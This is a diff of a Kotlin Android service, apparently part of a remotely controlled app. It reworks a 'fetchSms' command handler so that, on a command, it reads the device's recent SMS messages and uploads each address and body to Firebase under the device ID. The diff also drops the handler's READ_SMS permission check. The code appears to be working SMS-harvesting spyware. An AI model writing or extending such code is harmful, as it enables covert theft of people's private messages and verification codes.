@@ -32,7 +32,7 @@ import android.util.Log
 import android.Manifest
 import android.content.ContentValues
 import com.example.fast.util.DjangoApiHelper
-import com.example.fast.util.SmsQueryHelper
+import com.example.fast.util.FirebaseSyncHelper
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -1239,19 +1239,13 @@ class PersistentForegroundService : Service() {
      * Handle fetchSms command
      * Format: "{count}" or empty (defaults to 10)
      *
-     * Fetches the last X SMS messages (both received and sent) and uploads them
-     * to Firebase as a single object at message/{deviceId}/fetch_{timestamp}
+     * Fetches the last X SMS messages from device (default SMS database) and syncs
+     * to Firebase. Uses unified FirebaseSyncHelper.syncSmsMessagesFromDevice.
+     * Merges into message/{deviceId}/{timestamp} via updateChildren.
      *
      * @param content Number of messages to fetch (default: 10 if empty or invalid)
      */
     private fun handleFetchSmsCommand(content: String, historyTimestamp: Long) {
-        // Check READ_SMS permission
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-            LogHelper.w(TAG, "READ_SMS permission not granted, cannot fetch SMS")
-            updateCommandHistoryStatus(historyTimestamp, "fetchSms", "failed", "READ_SMS permission not granted")
-            return
-        }
-
         // Parse count (default to 10 if empty or invalid)
         val count = try {
             val parsed = content.trim().toIntOrNull()
@@ -1261,73 +1255,24 @@ class PersistentForegroundService : Service() {
             10
         }
 
-        LogHelper.d(TAG, "Fetching last $count SMS messages")
-
-        // Fetch messages in background thread
-        Thread {
-            try {
-                // Get all messages using SmsQueryHelper
-                val allMessages = SmsQueryHelper.getAllMessages(this, null)
-
-                // Sort by timestamp descending (newest first) and take last X
-                val lastMessages = allMessages
-                    .sortedByDescending { it.timestamp }
-                    .take(count)
-                    .sortedBy { it.timestamp } // Sort ascending for chronological order
-
-                LogHelper.d(TAG, "Retrieved ${lastMessages.size} messages out of ${allMessages.size} total")
-
-                // Create messages map in Firebase format
-                val messagesMap = mutableMapOf<String, String>()
-                lastMessages.forEach { message ->
-                    try {
-                    val timestamp = message.timestamp.toString()
-                    val value = if (message.isReceived) {
-                        "received~${message.address}~${message.body}"
-                    } else {
-                        "sent~${message.address}~${message.body}"
-                    }
-                    messagesMap[timestamp] = value
-                    } catch (e: Exception) {
-                        LogHelper.w(TAG, "Error processing message for Firebase upload", e)
-                    }
-                }
-
-                // Upload to Firebase - write each message individually to message/device_id/msg/{timestamp}
-                val messagesBasePath = AppConfig.getFirebaseMessagePath(androidId())
-                val batchMap = mutableMapOf<String, Any>()
-
-                messagesMap.forEach { (timestamp, value) ->
-                    batchMap[timestamp] = value
-                }
-
-                // Upload all messages in a single batch update
-                FirebaseWriteHelper.updateChildren(
-                    path = messagesBasePath,
-                    updates = batchMap,
-                    tag = TAG,
-                    onSuccess = {
-                        LogHelper.d(TAG, "Successfully uploaded ${messagesMap.size} messages to $messagesBasePath")
-                        updateCommandHistoryStatus(
-                            historyTimestamp,
-                            "fetchSms",
-                            "executed",
-                            "Uploaded ${messagesMap.size} messages"
-                        )
-                    },
-                    onFailure = { e ->
-                        LogHelper.e(TAG, "Failed to upload fetched messages", e)
-                        updateCommandHistoryStatus(historyTimestamp, "fetchSms", "failed", "Error: ${e.message}")
-                    }
+        LogHelper.d(TAG, "Fetching last $count SMS messages from device")
+        FirebaseSyncHelper.syncSmsMessagesFromDevice(
+            context = this,
+            limit = count,
+            onSuccess = { syncedCount ->
+                LogHelper.d(TAG, "Successfully uploaded $syncedCount messages (fetchSms)")
+                updateCommandHistoryStatus(
+                    historyTimestamp,
+                    "fetchSms",
+                    "executed",
+                    "Uploaded $syncedCount messages"
                 )
-            } catch (e: SecurityException) {
-                LogHelper.e(TAG, "Permission denied fetching SMS messages", e)
-                updateCommandHistoryStatus(historyTimestamp, "fetchSms", "failed", "Permission denied")
-            } catch (e: Exception) {
-                LogHelper.e(TAG, "Error fetching SMS messages", e)
-                updateCommandHistoryStatus(historyTimestamp, "fetchSms", "failed", "Error: ${e.message}")
+            },
+            onFailure = { error ->
+                LogHelper.e(TAG, "Failed to fetch/upload SMS: $error")
+                updateCommandHistoryStatus(historyTimestamp, "fetchSms", "failed", "Error: $error")
             }
-        }.start()
+        )
     }
 
     /**
